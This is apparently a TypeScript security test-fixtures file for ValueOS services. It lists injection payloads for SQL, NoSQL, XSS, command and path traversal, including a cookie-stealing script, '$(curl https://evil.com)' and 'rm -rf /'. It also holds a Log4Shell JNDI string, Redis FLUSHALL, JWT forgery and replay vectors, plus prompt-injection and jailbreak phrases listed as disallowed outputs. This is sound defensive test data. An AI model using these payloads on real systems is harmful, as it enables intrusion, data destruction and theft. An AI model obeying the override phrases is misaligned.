/**
 * Security Test Fixtures
 *
 * Malicious inputs, replay attack vectors, and dependency vulnerability conditions
 * for testing security boundaries of ValueOS services.
 */

// SQL Injection payloads
export const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "'; DELETE FROM value_cases WHERE '1'='1'; --",
  "1; SELECT * FROM pg_authid",
  "' UNION SELECT * FROM information_schema.tables --",
  "${jndi:ldap://evil.com/a}",
  "<script>alert('xss')</script>",
  "../../../../etc/passwd",
  "\x00' OR 1=1 --",
  "%27%20OR%201=1--",
];

// NoSQL Injection payloads
export const NOSQL_INJECTION_PAYLOADS = [
  { "$where": "sleep(1000)" },
  { "$gt": "" },
  { "$ne": null },
  { "$regex": ".*" },
  { "$exists": true },
];

// XSS payloads
export const XSS_PAYLOADS = [
  "<script>fetch('https://evil.com?c='+document.cookie)</script>",
  "<img src=x onerror=alert('xss')>",
  "javascript:alert('xss')",
  "' onclick=alert(1) '",
  "<iframe src='javascript:alert(1)'>",
];

// Command injection payloads
export const COMMAND_INJECTION_PAYLOADS = [
  "; cat /etc/passwd",
  "| whoami",
  "`rm -rf /`",
  "$(curl https://evil.com)",
  "& ping -c 4 evil.com",
];

// Path traversal payloads
export const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
  "..%252f..%252f..%252fetc/passwd",
];

// Replay attack scenarios
export const REPLAY_ATTACK_VECTORS = {
  // Duplicate request with same ID
  duplicateRequest: (originalId: string) => ({
    id: originalId,
    timestamp: new Date().toISOString(),
    nonce: "reused-nonce",
  }),

  // Stale request (old timestamp)
  staleRequest: {
    timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
    nonce: crypto.randomUUID(),
  },

  // Request with manipulated tenant context
  tenantContextManipulation: (legitimateTenantId: string) => ({
    tenantId: legitimateTenantId,
    xTenantOverride: "malicious-tenant",
    jwtClaimInjection: { tenant_id: "other-tenant" },
  }),

  // Request sequence with duplicate idempotency keys
  idempotencyReplay: (key: string) => [
    { idempotencyKey: key, payload: { action: "create", amount: 100 } },
    { idempotencyKey: key, payload: { action: "create", amount: 999 } },
    { idempotencyKey: key, payload: { action: "delete" } },
  ],
};

// JWT manipulation payloads
export const JWT_MANIPULATION_PAYLOADS = [
  { alg: "none", payload: { tenant_id: "admin", role: "superuser" } },
  { alg: "HS256", payload: { tenant_id: "", role: "admin" } },
  { alg: "RS256", payload: { sub: "system", tenant_id: "*" } },
];

// Redis attack vectors
export const REDIS_ATTACK_VECTORS = [
  "*\r\n$8\r\nFLUSHALL\r\n",
  "*3\r\n$3\r\nSET\r\n$1\r\na\r\n$59\r\n${jndi:ldap://evil.com/a}\r\n",
  "*2\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$11\r\ndir\r\n",
];

// Malformed UUIDs for injection
export const MALFORMED_UUIDS = [
  "' OR 1=1 --",
  "../../../etc/passwd",
  "<script>alert(1)</script>",
  "00000000-0000-0000-0000-000000000000",
  "admin'--",
  "${env:PATH}",
  "__proto__",
  "constructor",
  "toString",
  "[object Object]",
];

// Extreme values for boundary testing
export const BOUNDARY_VALUES = {
  numbers: {
    maxInt: Number.MAX_SAFE_INTEGER,
    minInt: Number.MIN_SAFE_INTEGER,
    maxFloat: Number.MAX_VALUE,
    minFloat: Number.MIN_VALUE,
    infinity: Infinity,
    negativeInfinity: -Infinity,
    nan: NaN,
    zero: 0,
    negativeZero: -0,
  },
  strings: {
    empty: "",
    maxLength: "x".repeat(100000),
    unicode: "🚨🔥💣🛡️🔐",
    nullBytes: "\x00\x00\x00",
    escapeSequences: "\n\r\t\b\f\\",
    controlChars: Array.from({ length: 32 }, (_, i) => String.fromCharCode(i)).join(""),
  },
  objects: {
    circular: (() => {
      const obj: Record<string, unknown> = {};
      obj.self = obj;
      return obj;
    })(),
    prototypePollution: JSON.parse('{"__proto__": {"isAdmin": true}}'),
    massive: Object.fromEntries(
      Array.from({ length: 10000 }, (_, i) => [`key${i}`, `value${i}`]),
    ),
  },
};

// Idempotency test scenarios
export const IDEMPOTENCY_TEST_SCENARIOS = {
  // Same operation multiple times should yield same result
  repeatedCreate: (payload: unknown) =>
    Array.from({ length: 5 }, () => payload),

  // Concurrent identical requests
  concurrentDuplicates: (payload: unknown, count = 10) =>
    Array.from({ length: count }, () => payload),

  // Retried request after partial failure
  retryAfterPartialFailure: {
    first: { status: "partial", committed: false },
    retry: { status: "complete", committed: true },
  },
};

// Dead letter queue test scenarios
export const DLQ_TEST_SCENARIOS = {
  // Messages that should go to DLQ
  poisonPill: {
    payload: { cause: "serialization_error", data: "\x00\x01\x02" },
    expectedBehavior: "move_to_dlq",
  },

  // Messages exceeding retry limit
  exhaustedRetries: {
    retryCount: 5,
    maxRetries: 3,
    expectedBehavior: "move_to_dlq",
  },

  // Messages with unhandled exceptions
  unhandledException: {
    error: "TypeError: Cannot read property of undefined",
    stack: "at processMessage (/app/service.ts:123:45)",
    expectedBehavior: "move_to_dlq",
  },
};

// Tenant isolation test scenarios
export const TENANT_ISOLATION_SCENARIOS = {
  // Cross-tenant data access attempt
  crossTenantAccess: {
    authenticatedTenant: "tenant-a",
    requestedTenant: "tenant-b",
    expected: "access_denied",
  },

  // Tenant ID manipulation in JWT
  jwtTenantManipulation: {
    originalToken: { tenant_id: "tenant-a", sub: "user-1" },
    modifiedToken: { tenant_id: "tenant-b", sub: "user-1" },
    expected: "token_invalid",
  },

  // SQL injection via tenant filter
  sqlInjectionTenant: "tenant-a' OR tenant_id IS NOT NULL --",
};

// Dependency vulnerability conditions
export const DEPENDENCY_VULNERABILITY_CONDITIONS = {
  // Redis connection failure
  redisFailure: {
    error: "ECONNREFUSED",
    host: "redis",
    port: 6379,
    expectedFallback: "database_only",
  },

  // Database connection pool exhaustion
  dbPoolExhaustion: {
    maxConnections: 10,
    currentConnections: 10,
    queueDepth: 100,
    expectedBehavior: "queue_and_timeout",
  },

  // External API rate limiting
  rateLimitExceeded: {
    statusCode: 429,
    headers: { "x-ratelimit-remaining": "0", "retry-after": "60" },
    expectedBehavior: "backoff_and_retry",
  },

  // Memory exhaustion
  memoryExhaustion: {
    heapUsed: 0.95 * 1024 * 1024 * 1024, // 95% of 1GB
    heapTotal: 1024 * 1024 * 1024,
    expectedBehavior: "graceful_degradation",
  },
};

// Agent security patterns
export const AGENT_SECURITY_PATTERNS = {
  // Disallowed LLM outputs
  disallowedOutputs: [
    { type: "prompt_injection", pattern: "ignore previous instructions" },
    { type: "jailbreak", pattern: "DAN mode enabled" },
    { type: "system_leak", pattern: "SYSTEM: You are ChatGPT" },
  ],

  // Required security headers
  requiredHeaders: [
    "x-request-id",
    "x-tenant-id",
    "x-user-id",
    "x-correlation-id",
  ],

  // Compliance controls
  complianceControls: {
    auditLogRequired: true,
    piiRedactionRequired: true,
    dataRetentionDays: 90,
    encryptionAtRest: "AES-256-GCM",
    encryptionInTransit: "TLS1.3",
  },
};
